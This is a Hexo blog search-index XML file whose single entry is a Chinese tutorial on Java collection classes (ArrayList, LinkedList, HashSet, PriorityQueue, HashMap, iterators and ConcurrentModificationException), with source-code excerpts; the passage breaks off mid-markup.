<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java容器</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/Java%20%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%B9%E5%99%A8/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/LipeiNet/p/5888513.html" target="_blank" rel="noopener">文摘自 IpeiNet 博客(主体)</a></p>
<p><a href="jianshu.com/p/c5b52927a61a">Iterator 和 forEach 部分</a></p>
<p>Java中经常会用到容器，也就是相关的集合类。各容器之间的关系如下：</p>
<p><img data-src="https://i.loli.net/2021/01/23/uS7KM5oGc2ZNpUW.png" alt="img"></p>
<p>其中淡绿色的表示接口，红色的表示我们经常使用的类。</p>
<h2 id="1：基本概念"><a href="#1：基本概念" class="headerlink" title="1：基本概念"></a>1：基本概念</h2><p>Java容器类类库的用途是保存对象，可以将其分为2个概念。</p>
<a id="more"></a>

<p>1.1：Collection</p>
<p>一个独立元素的序列，这些元素都服从一条或多条规则。其中List必须按照插入的顺序保存元素、Set不能有重复的元素、Queue按照排队规则来确定对象的产生顺序（通常也是和插入顺序相同）</p>
<p>1.2：Map</p>
<p>一组成对的值键对对象，允许用键来查找值。ArrayList允许我们用数字来查找值，它是将数字和对象联系在一起。而Map允许我们使用一个对象来查找某个对象，它也被称为关联数组。或者叫做字典。</p>
<h2 id="2：List"><a href="#2：List" class="headerlink" title="2：List"></a>2：List</h2><p>List承诺可以将元素维护在特定的序列中。List接口在Collection的基础上加入了大量的方法，使得可以在List中间可以插入和移除元素。下面主要介绍2种List</p>
<h3 id="2-1：基本的ArrayList"><a href="#2-1：基本的ArrayList" class="headerlink" title="2.1：基本的ArrayList"></a>2.1：基本的ArrayList</h3><p>它的优点在于随机访问元素快，但是在中间插入和移除比较慢</p>
<p>那么现在我们就一起来看看为什么ArrayList随机访问快，而插入移除比较慢。先说关于ArrayList的初始化。</p>
<p>ArrayList有三种方式进行初始化如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Object[] elementData;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;	<span class="comment">// 无参构造器，创建一个长度为10的数组</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal Capacity: "</span>+</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        <span class="keyword">this</span>.elementData = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">    &#125;	<span class="comment">// 创建一个长度为 initialCapacity 的 Object 类型数组</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">ArrayList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        elementData = c.toArray();	<span class="comment">// toArray() 返回一个包含该集合中所有元素的数组</span></span><br><span class="line">        size = elementData.length;</span><br><span class="line">        <span class="comment">// c.toArray might (incorrectly) not return Object[] (see 6260652)</span></span><br><span class="line">        <span class="keyword">if</span> (elementData.getClass() != Object[]<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">            <span class="title">elementData</span> </span>= Arrays.copyOf(elementData, size, Object[]<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;	<span class="comment">// 构造一个包含指定集合的元素的列表，按照它们由集合的迭代器返回的顺序。</span></span><br></pre></td></tr></table></figure>

<p>我们可以看出ArrayList其实就是采用的是数组（默认是长度为10的数组）。所有ArrayList在读取的时候是具有和数组一样的效率，它的时间复杂度为1。</p>
<p>插入尾部就是elementData[size++] = e;当然中间会进行扩容。现在主要说插入中间为什么相对来说比较慢源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        rangeCheckForAdd(index);<span class="comment">//验证（可以不考虑）</span></span><br><span class="line"></span><br><span class="line">        ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!（超过当前数组长度进行扩容）</span></span><br><span class="line">    </span><br><span class="line">    	<span class="comment">// System.arraycopy(elementData, index, elementData, index + 1, size - index)</span></span><br><span class="line">    	<span class="comment">// 第一个参数是源数组，源数组起始位置，目标数组，目标数组起始位置，复制数组元素数目。</span></span><br><span class="line">    	<span class="comment">// 那么这个意思就是从index索性处每个元素向后移动一位，最后把索引为index空出来，</span></span><br><span class="line">    	<span class="comment">// 并将element赋值给它。这样一来我们并不知道要插入哪个位置，所以会进行匹配那么它的时间赋值度就为n。</span></span><br><span class="line">        System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>,</span><br><span class="line">                         size - index);(核心代码)</span><br><span class="line">        elementData[index] = element;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2：LinkedList"><a href="#2-2：LinkedList" class="headerlink" title="2.2：LinkedList"></a>2.2：LinkedList</h3><p>它是通过代价较低在List中间进行插入和移除，提供了优化的顺序访问，但是在随机访问方面相对较慢。但是他的特性功能要比ArrayList强大的多。支持Queue和Stack</p>
<p>Link1edList采用的是链式存储。链式存储就会定一个节点Node。包括三部分前驱节点、后继节点以及data值。所以存储存储的时候他的物理地址不一定是连续的。</p>
<p>我们看下它的中间插入实现：</p>
<p><img data-src="https://i.loli.net/2021/01/23/l4IPOLKJeNa85Ti.png" alt="img"></p>
<p><img data-src="https://i.loli.net/2021/01/23/fXGshrRUE2M8SYH.png" alt="img"></p>
<p>从代码我们可以看出先获取插入索引元素的前驱节点，然后把这个元素作为后继节点，然后在创建新的节点，而新的节点前驱节点和获取前驱节点相同，而后继节点则等于要移动的这个元素。所以这里是不需要循环的，从而在插入和删除的时候效率比较高。</p>
<p>我们在来看看查询（我们可以分析出它的效率要比ArrayList低了不少）</p>
<p><img data-src="https://i.loli.net/2021/01/23/JyLVHM9O1gdfchq.png" alt="img"></p>
<h2 id="3：Set"><a href="#3：Set" class="headerlink" title="3：Set"></a>3：Set</h2><p>Set也是一个集合，但是他的特点是不可以有重复的对象，所以Set最常用的就是测试归属性，很容易的询问出某个对象是否存在Set中。并且Set是具有和Collection完全一样的接口，没有额外的功能，只是表现的行为不同。</p>
<h3 id="3-1：HashSet"><a href="#3-1：HashSet" class="headerlink" title="3.1：HashSet"></a>3.1：HashSet</h3><p>HashSet查询速度比较快，但是存储的元素是随机的并没有排序，下面我写一段程序看一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 没有顺序可循，这是因为hashset采用的是散列（处于速度考虑）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Random random=<span class="keyword">new</span> Random();</span><br><span class="line">        Set&lt;Integer&gt; intset=<span class="keyword">new</span> HashSet&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)&#123;</span><br><span class="line">            intset.add(random.nextInt(<span class="number">30</span>));	<span class="comment">// random.nextInt() 返回一个 Int 类型随机数，并从给定的随机数发生器的序列中均匀分布 Int 值</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(intset);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/01/23/jxsHMwFDc93G8OS.png" alt="img"></p>
<p>可以看到在HashSet列表中元素的存储是随机且没有顺序的，如果你需要让所存取的数据有序则可以考虑Set集合的另一种形式：TreeSet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Random random=<span class="keyword">new</span> Random();</span><br><span class="line">        Set&lt;Integer&gt; intset=<span class="keyword">new</span> TreeSet&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)&#123;</span><br><span class="line">            intset.add(random.nextInt(<span class="number">30</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(intset);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/01/23/QfUvYzP4VaDC2jk.png" alt="img"></p>
<h2 id="4：Queue"><a href="#4：Queue" class="headerlink" title="4：Queue"></a>4：Queue</h2><p>Queue是队列，队列是典型的先进先出的容器，就是从容器的一端放入元素，从另一端取出，并且元素放入容器的顺序和取出的顺序是相同的。LinkedList提供了对Queue的实现，LinkedList向上转型为Queue。其中Queue有offer、peek、element、pool、remove等方法</p>
<p>offer是将元素插入队尾，返回false表示添加失败。peek和element都将在不移除的情况下返回对头，但是peek在对头为null的时候返回null，而element会抛出NoSuchElementException异常。poll和remove方法将移除并返回对头，但是poll在队列为null，而remove会抛出NoSuchElementException异常，以下是例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Queue&lt;Integer&gt; queue=<span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        Random rand=<span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            queue.offer(rand.nextInt(i+<span class="number">10</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        printQ(queue);</span><br><span class="line">        Queue&lt;Character&gt; qc=<span class="keyword">new</span> LinkedList&lt;Character&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c:<span class="string">"HelloWorld"</span>.toCharArray())&#123;</span><br><span class="line">            qc.offer(c);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(qc.peek());</span><br><span class="line">        printQ(qc);</span><br><span class="line">        List&lt;String&gt; mystrings=<span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">        mystrings.add(<span class="string">"1"</span>);</span><br><span class="line">        mystrings.get(<span class="number">0</span>);</span><br><span class="line">        Set&lt;String&gt; a=<span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        Set&lt;String&gt; set=<span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        set.add(<span class="string">"1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printQ</span><span class="params">(Queue queue)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (queue.peek() != <span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.print(queue.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/01/23/ckq7jnBIvZbXAlE.png" alt="image-20210101183851507"></p>
<p>同样的，从上面的输出的结果我们可以看出结果并不是一个顺序的，没有规则的，这个时候如果想让队列按照规则输出那么这个时候我们就要考虑优先级了，这个时候我们就应该使用PriorityQueue，这个时候如果在调用offer方法插入一个对象的时候，这个对象就会按照优先级在对列中进行排序，默认的情况是自然排序，当然我们可以通过Comparator来修改这个顺序（在下一篇讲解）。PriorityQueue可以确保当你调用peek、pool、remove方法时，获取的元素将是对列中优先级最高的元素。ok我们再次通过代码查看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        PriorityQueue&lt;Integer&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Integer&gt;();</span><br><span class="line">        Random rand = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            priorityQueue.offer(rand.nextInt(i + <span class="number">10</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        QueueDemo.printQ(priorityQueue);</span><br><span class="line">        List&lt;Integer&gt;ints= Arrays.asList(<span class="number">25</span>,<span class="number">22</span>,<span class="number">20</span>,<span class="number">18</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>);</span><br><span class="line">        priorityQueue=<span class="keyword">new</span> PriorityQueue&lt;Integer&gt;(ints);</span><br><span class="line">        QueueDemo.printQ(priorityQueue);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/01/23/4lA9HIEh3kUt1nw.png" alt="img"></p>
<p>PriorityQueue 实现比较器 Comparator 代码示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        PriorityQueue&lt;Integer&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(<span class="keyword">new</span> Comparator&lt;Integer&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> -o1.compareTo(o2);	<span class="comment">// 从大到小排序</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Random rand = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            priorityQueue.offer(rand.nextInt(i + <span class="number">10</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        printQ(priorityQueue);</span><br><span class="line">        List&lt;Integer&gt;ints= Arrays.asList(<span class="number">25</span>,<span class="number">22</span>,<span class="number">20</span>,<span class="number">18</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">21</span>,<span class="number">23</span>,<span class="number">25</span>);</span><br><span class="line">        priorityQueue=<span class="keyword">new</span> PriorityQueue&lt;Integer&gt;(ints);</span><br><span class="line">        printQ(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printQ</span><span class="params">(Queue queue)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (queue.peek() != <span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.print(queue.poll() + <span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>从输出可以看到，重复是允许的，最小值拥有最高优先级（如果是String，空格也可以算作值，并且比字母具有更高的优先级）如果你想消除重复，可以采用Set进行存储，然后把Set作为priorityQueue对象的初始值即可。</p>
<p>Queue 集合依然可以使用循环遍历的方式读取数据:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QueueDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//add()和remove()方法在失败的时候会抛出异常(不推荐)</span></span><br><span class="line">        Queue&lt;String&gt; queue = <span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">        <span class="comment">//添加元素</span></span><br><span class="line">        queue.offer(<span class="string">"a"</span>);</span><br><span class="line">        queue.offer(<span class="string">"b"</span>);</span><br><span class="line">        queue.offer(<span class="string">"c"</span>);</span><br><span class="line">        queue.offer(<span class="string">"d"</span>);</span><br><span class="line">        queue.offer(<span class="string">"e"</span>);</span><br><span class="line">        <span class="keyword">for</span>(String q : queue)&#123;</span><br><span class="line">            System.out.print(q + <span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">"|| "</span>);</span><br><span class="line">        System.out.print(<span class="string">"poll="</span>+queue.poll() + <span class="string">"|"</span>); <span class="comment">//返回第一个元素，并在队列中删除</span></span><br><span class="line">        <span class="keyword">for</span>(String q : queue)&#123;</span><br><span class="line">            System.out.print(q + <span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">"|| "</span>);</span><br><span class="line">        System.out.print(<span class="string">"element="</span>+queue.element() + <span class="string">"|"</span>); <span class="comment">//返回第一个元素</span></span><br><span class="line">        <span class="keyword">for</span>(String q : queue)&#123;</span><br><span class="line">            System.out.print(q + <span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">"|| "</span>);</span><br><span class="line">        System.out.print(<span class="string">"peek="</span>+queue.peek() + <span class="string">"|"</span>); <span class="comment">//返回第一个元素</span></span><br><span class="line">        <span class="keyword">for</span>(String q : queue)&#123;</span><br><span class="line">            System.out.print(q + <span class="string">" "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/01/23/Ve7gfES1vauMdLZ.png" alt="image-20210101184857264"></p>
<p><img data-src="https://i.loli.net/2021/01/23/AmlRLDi8KcdFnyo.png" alt="image-20210101192048950"></p>
<h2 id="5：Map"><a href="#5：Map" class="headerlink" title="5：Map"></a>5：Map</h2><p>Map在实际开发中使用非常广，特别是HashMap，想象一下我们要保存一个对象中某些元素的值，如果我们在创建一个对象显得有点麻烦，这个时候我们就可以用上map了，HashMap采用是散列函数所以查询的效率是比较高的，如果我们需要一个有序的我们就可以考虑使用TreeMap。这里主要介绍一下HashMap的方法，注意HashMap的键可以是null，而且键值不可以重复，如果重复了以后就会对第一个进行键值进行覆盖。</p>
<p>put进行添加值键对，containsKey验证主要是否存在、containsValue验证值是否存在、keySet获取所有的键集合、values获取所有值集合、entrySet获取键值对。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//Map&lt;String,String&gt; pets=new HashMap&lt;String, String&gt;();</span></span><br><span class="line">        Map&lt;String,String&gt; pets=<span class="keyword">new</span> TreeMap&lt;String, String&gt;();</span><br><span class="line">        pets.put(<span class="string">"1"</span>,<span class="string">"张三"</span>);</span><br><span class="line">        pets.put(<span class="string">"2"</span>,<span class="string">"李四"</span>);</span><br><span class="line">        pets.put(<span class="string">"3"</span>,<span class="string">"王五"</span>);</span><br><span class="line">        <span class="keyword">if</span> (pets.containsKey(<span class="string">"1"</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">"已存在键1"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pets.containsValue(<span class="string">"张三"</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">"已存在值张三"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;String&gt; sets=pets.keySet();</span><br><span class="line">        Set&lt;Map.Entry&lt;String , String&gt;&gt; entrySet= pets.entrySet();	<span class="comment">// Map.Entry 可以理解为一个新的类型，类似于常见的 String 类型</span></span><br><span class="line">        Collection&lt;String&gt; values=  pets.values();</span><br><span class="line">        <span class="keyword">for</span> (String value:values)&#123;</span><br><span class="line">            System.out.println(value+<span class="string">";"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">for</span> (String key:sets)&#123;</span><br><span class="line">           System.out.print(key+<span class="string">";"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:entrySet)&#123;</span><br><span class="line">            System.out.println(<span class="string">"键："</span>+entry.getKey());</span><br><span class="line">            System.out.println(<span class="string">"值："</span>+entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<img data-src="https://i.loli.net/2021/01/23/jQvRXd9xE1nhi7U.png" alt="img">

<h2 id="6：Iterator和Foreach"><a href="#6：Iterator和Foreach" class="headerlink" title="6：Iterator和Foreach"></a>6：Iterator和Foreach</h2><p>现在foreach语法主要作用于数组，但是他也可以应用于所有的Collection对象。Collection之所以能够使用foreach是由于继承了Iterator这个接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IteratorDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Iterator iterator = <span class="keyword">new</span> IteratorClass().iterator();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (Iterator it=iterator;iterator.hasNext();) &#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IteratorClass</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;String&gt; <span class="title">iterator</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Itr();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">String</span>&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> String[] words=(<span class="string">"Hello Java"</span>).split(<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> index&lt;words.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> words[index++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从中我们可以看出foreach循环最终是转换成 for (Iterator it=iterator;iterators.hasNext();)只不过jdk帮我们隐藏了我们无法查看。下面我们再来分析一个问题，当我们迭代一个ArrayList或者HashMap时，如果尝试对集合做一些修改操作（例如删除元素），可能会抛出<code>java.util.ConcurrentModificationException</code>的异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddRemoveListElement</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        list.add(<span class="string">"A"</span>);</span><br><span class="line">        list.add(<span class="string">"B"</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (String s : list) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.equals(<span class="string">"B"</span>)) &#123;</span><br><span class="line">                list.remove(s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//foreach循环等效于迭代器</span></span><br><span class="line">        <span class="comment">/*Iterator&lt;String&gt; iterator=list.iterator();</span></span><br><span class="line"><span class="comment">        while(iterator.hasNext())&#123;</span></span><br><span class="line"><span class="comment">            String s=iterator.next();</span></span><br><span class="line"><span class="comment">            if (s.equals("B")) &#123;</span></span><br><span class="line"><span class="comment">                list.remove(s);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;*/</span>    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>![img](Java 中常见的容器.assets/1529069-7c55ae4fbbb6e883.jpg)</p>
<h3 id="异常原因"><a href="#异常原因" class="headerlink" title="异常原因"></a>异常原因</h3><p>ArrayList的父类AbstarctList中有一个域<code>modCount</code>，每次对集合进行修改（增添元素，删除元素……）时都会<code>modCount++</code></p>
<p>而foreach的背后实现原理其实就是Iterator，等同于注释部分代码。在这里，迭代ArrayList的Iterator中有一个变量<code>expectedModCount</code>，该变量会初始化和<code>modCount</code>相等，但如果接下来如果集合进行修改<code>modCount</code>改变，就会造成<code>expectedModCount!=modCount</code>，此时就会抛出java.util.ConcurrentModificationException异常</p>
<p>过程如下图：</p>
<p>![img](Java 中常见的容器.assets/1529069-2523e3564181c304.jpg)</p>
<p>我们再来根据源码详细的走一遍这个过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *AbstarctList的内部类，用于迭代</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cursor = <span class="number">0</span>;   <span class="comment">//将要访问的元素的索引</span></span><br><span class="line">    <span class="keyword">int</span> lastRet = -<span class="number">1</span>;  <span class="comment">//上一个访问元素的索引</span></span><br><span class="line">    <span class="keyword">int</span> expectedModCount = modCount;<span class="comment">//expectedModCount为预期修改值，初始化等于modCount（AbstractList类中的一个成员变量）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断是否还有下一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> cursor != size();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//取出下一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();  <span class="comment">//关键的一行代码，判断expectedModCount和modCount是否相等</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        E next = get(cursor);</span><br><span class="line">        lastRet = cursor++;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException e) &#123;</span><br><span class="line">        checkForComodification();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lastRet == -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line">            checkForComodification();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        AbstractList.<span class="keyword">this</span>.remove(lastRet);</span><br><span class="line">        <span class="keyword">if</span> (lastRet &lt; cursor)</span><br><span class="line">            cursor--;</span><br><span class="line">        lastRet = -<span class="number">1</span>;</span><br><span class="line">        expectedModCount = modCount;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 